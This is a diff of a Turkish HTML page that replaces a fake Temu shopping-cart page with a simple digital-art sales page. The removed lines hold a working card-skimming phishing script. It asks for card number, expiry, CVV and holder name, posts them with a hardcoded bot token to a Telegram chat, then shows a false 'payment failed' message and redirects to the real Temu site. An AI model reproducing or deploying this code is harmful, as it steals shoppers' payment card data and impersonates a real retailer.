@@ -1,192 +1,156 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <title>Temu - Sepet</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Dijital İçerik Satışı</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <style>
     body {
+      margin: 0;
       font-family: Arial, sans-serif;
-      margin: 0;
-      background-color: #f3f3f3;
-      background-image: url('s8sV1TlRdnNOQZ3oQSfkPtmIuMjiEiAte2kWYSYt_480.jpg');
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
-      background-attachment: fixed;
+      background: #fff0f0;
+      color: #2b2b2b;
     }
-    .navbar {
-      background-color: white;
-      padding: 10px 20px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-    .logo-text {
-      font-weight: bold;
-      font-size: 24px;
-      color: #ff6c00;
-    }
-    .nav-links {
-      display: flex;
-      gap: 15px;
-    }
-    .nav-links a {
-      text-decoration: none;
-      color: #333;
-      font-size: 14px;
-    }
-    .container {
-      max-width: 400px;
-      margin: 30px auto;
-      background: rgba(255, 255, 255, 0.95);
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-    }
-    h2 {
-      color: #c8102e;
-      margin-bottom: 15px;
-    }
-    .product {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 15px;
-    }
-    .product img {
-      width: 80px;
-      height: auto;
-      border-radius: 6px;
-    }
-    .product-info {
-      flex: 1;
-    }
-    .product-info h4 {
-      margin: 0;
-      font-size: 16px;
-      color: #333;
-    }
-    .product-info p {
-      margin: 5px 0 0;
-      font-size: 14px;
-      color: #666;
-    }
-    button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 15px;
-      background-color: #c8102e;
+    header {
+      background: #b00020;
       color: white;
-      font-weight: bold;
+      padding: 20px;
+      text-align: center;
+    }
+    .products {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      padding: 20px;
+      gap: 20px;
+    }
+    .card {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      width: 220px;
+      text-align: center;
+      padding: 15px;
+      transition: 0.3s;
+    }
+    .card:hover {
+      transform: translateY(-4px);
+    }
+    .card img {
+      max-width: 100%;
+      border-radius: 8px;
+    }
+    .card button {
+      margin-top: 10px;
+      padding: 10px 20px;
+      background: #b00020;
+      color: white;
       border: none;
-      border-radius: 4px;
+      border-radius: 8px;
       cursor: pointer;
     }
-    button:hover {
-      background-color: #a40e25;
+    .card button:hover {
+      background: #a0001a;
     }
-    .payment-form {
-      display: none;
-      margin-top: 20px;
+    .form-section {
+      padding: 30px;
+      max-width: 400px;
+      margin: 0 auto;
     }
-    input {
-      width: 100%;
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    form input, form textarea {
       padding: 10px;
-      margin-top: 10px;
       border: 1px solid #ccc;
-      border-radius: 4px;
-      box-sizing: border-box;
+      border-radius: 8px;
     }
-    .footer {
+    form button {
+      background: #b00020;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+    }
+    footer {
+      background: #b00020;
+      color: white;
       text-align: center;
-      font-size: 12px;
-      margin: 30px auto;
-      color: #999;
-    }
-    @media (max-width: 480px) {
-      .navbar {
-        flex-direction: column;
-        align-items: flex-start;
-      }
-      .nav-links {
-        margin-top: 10px;
-        flex-direction: column;
-        width: 100%;
-      }
-      .nav-links a {
-        padding: 5px 0;
-      }
+      padding: 10px;
+      margin-top: 30px;
     }
   </style>
 </head>
 <body>
 
-  <div class="navbar">
-    <div class="logo-text">TEMU</div>
-    <div class="nav-links">
-      <a href="https://www.temu.com">Anasayfa</a>
-      <a href="https://www.temu.com">Sepetiniz</a>
-      <a href="https://www.temu.com">Hesabım</a>
-    </div>
+<header>
+  <h1><i class="fa-solid fa-image"></i> Dijital Ürün Galerisi</h1>
+  <p>Sanatınızı satın alın - güvenli ödeme</p>
+</header>
+
+<section class="products">
+  <div class="card">
+    <img src="https://via.placeholder.com/200x150" alt="ürün1" />
+    <h3>Resim 1</h3>
+    <p>₺50</p>
   </div>
-
-  <div class="container">
-    <h2>Sepetiniz</h2>
-    <div class="product">
-      <img src="dsc00488_27.06.2023_17daee7.jpg" alt="Ürün Fotoğrafı">
-      <div class="product-info">
-        <h4>Mavi Yazlık Elbise</h4>
-        <p>Fiyat: 399,99 TL</p>
-      </div>
-    </div>
-
-    <button onclick="showPayment()">Ödemeye Geç</button>
-
-    <div class="payment-form" id="paymentForm">
-      <h2>Kredi Kartı ile Ödeme</h2>
-      <input type="text" placeholder="Kart Numarası" id="cardNumber">
-      <input type="text" placeholder="Son Kullanma Tarihi (MM/YY)" id="expiryDate">
-      <input type="text" placeholder="CVV" id="cvv">
-      <input type="text" placeholder="Kart Sahibi Adı" id="cardHolder">
-      <button onclick="sendToTelegram()">Ödemeyi Onayla</button>
-    </div>
+  <div class="card">
+    <img src="https://via.placeholder.com/200x150" alt="ürün2" />
+    <h3>Resim 2</h3>
+    <p>₺60</p>
   </div>
+  <div class="card">
+    <img src="https://via.placeholder.com/200x150" alt="ürün3" />
+    <h3>Resim 3</h3>
+    <p>₺40</p>
+  </div>
+</section>
 
-  <script>
-    function showPayment() {
-      document.getElementById('paymentForm').style.display = 'block';
-    }
+<section class="form-section">
+  <h2><i class="fa-solid fa-credit-card"></i> Satın Alma Formu</h2>
+  <form id="buyForm">
+    <input type="text" name="isim" placeholder="Ad Soyad" required />
+    <input type="email" name="email" placeholder="E-posta" required />
+    <textarea name="not" placeholder="Notunuz (ürün adı yazın)"></textarea>
+    <input type="file" name="dekont" required />
+    <button type="submit"><i class="fa-solid fa-paper-plane"></i> Gönder</button>
+  </form>
+  <p style="font-size: 0.9em; margin-top: 10px; color: #555;">
+    Ödeme için: IBAN TR00 0000 0000 0000 - Açıklama: "Adınız & Ürün adı"
+  </p>
+</section>
 
-    function sendToTelegram() {
-      const token = "7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU";
-      const chatId = "5395609882";
-      const cardNumber = document.getElementById('cardNumber').value;
-      const expiryDate = document.getElementById('expiryDate').value;
-      const cvv = document.getElementById('cvv').value;
-      const cardHolder = document.getElementById('cardHolder').value;
+<footer>
+  &copy; 2025 Dijital İçerik Satışı | Telegram: @senin_kullanicin
+</footer>
 
-      const message = `[Ziraat Kart Formu]\nKart No: ${cardNumber}\nSKT: ${expiryDate}\nCVV: ${cvv}\nKart Sahibi: ${cardHolder}`;
+<script>
+  document.getElementById("buyForm").addEventListener("submit", function(e) {
+    e.preventDefault();
 
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `chat_id=${chatId}&text=${encodeURIComponent(message)}`
-      })
-      .then(response => {
-        if (response.ok) {
-          alert("Ödemeniz onaylanamadı.\n\nLütfen tekrar deneyin.");
-          window.location.href = "https://www.temu.com/tr/attendance/mothers-day-selection-37777-1-a-psurl.html?_x_chnl_src=top_banner&_x_big_sale_name=mothers_day_selection&banner_type=1&_x_ns_irclickid=TIG3fL2IHxycUrUwPTxGwygsUksWwJ2FXW7D3U0&_x_ads_account=18350&_x_ads_id=1583288&_x_ns_iradname=Temu%20Product%20Ad&_x_ns_iradsize=&_x_ns_prodsku=&_x_ns_irmptype=mediapartner&_x_ns_sharedid=246477&_x_ns_ts=1746607143657&_x_ns_randint=6371876&_x_ns_adtype=PRODUCT_CATALOG&_x_ns_irmpgroupname=%22kz%22&_x_ads_channel=impact&_x_ns_mp_value2=&_x_ns_mp_value3=&_x_ns_irmpname=DMS%20CD%20(Netherlands)%20B.V.&_x_ns_irpid=1934383&refer_page_name=home&refer_page_id=10005_1746607144954_qd7wqa2exk&refer_page_sn=10005&_x_sessn_id=awgncdhv1k";
-        } else {
-          alert("Gönderim başarısız oldu.");
-        }
-      })
-      .catch(error => {
-        alert("Bir hata oluştu: " + error);
-      });
-    }
-  </script>
+    // Form verileri toplanıyor
+    const formData = new FormData(this);
+    const message = `
+Yeni Sipariş!
+👤 İsim: ${formData.get("isim")}
+📧 E-posta: ${formData.get("email")}
+📝 Not: ${formData.get("not")}
+📎 Dekont yüklendi: EVET
+    `;
+
+    // Telegram bot mesajı gönderme (sunucu tarafında gerçek endpoint olmalı)
+    fetch("https://YOUR_BACKEND_URL/telegram", {
+      method: "POST",
+      body: JSON.stringify({ text: message }),
+      headers: {
+        "Content-Type": "application/json"
+      }
+    }).then(() => alert("Siparişiniz alındı!")).catch(() => alert("Bir hata oluştu."));
+  });
+</script>
 
 </body>
 </html>
